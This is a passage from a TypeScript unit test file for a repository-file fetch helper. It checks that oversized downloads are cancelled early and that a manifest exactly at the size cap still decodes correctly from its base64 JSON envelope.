    // Cancelled shortly after the cap was passed rather than draining all 4 MB.
    expect(seen.pulled).toBeLessThan(16);
  });

  it("a full-size legal manifest still round-trips: the cap has base64 + envelope headroom", async () => {
    const text = "#".repeat(MAX_MANIFEST_BYTES); // exactly the parser's cap
    const envelope = JSON.stringify({
      content: Buffer.from(text, "utf8").toString("base64"),
      encoding: "base64",
    });
    expect(Buffer.byteLength(envelope)).toBeLessThan(MAX_REPO_FILE_BYTES);
    const fetchImpl: FetchImpl = async () =>
      new Response(envelope, { status: 200 }) as unknown as Response;
    expect(
      await fetchRepoFile(
        "tok",
        "acme",
        "app",
        ".pkey/product.yaml",
        fetchImpl,
      ),
    ).toBe(text);
  });
});
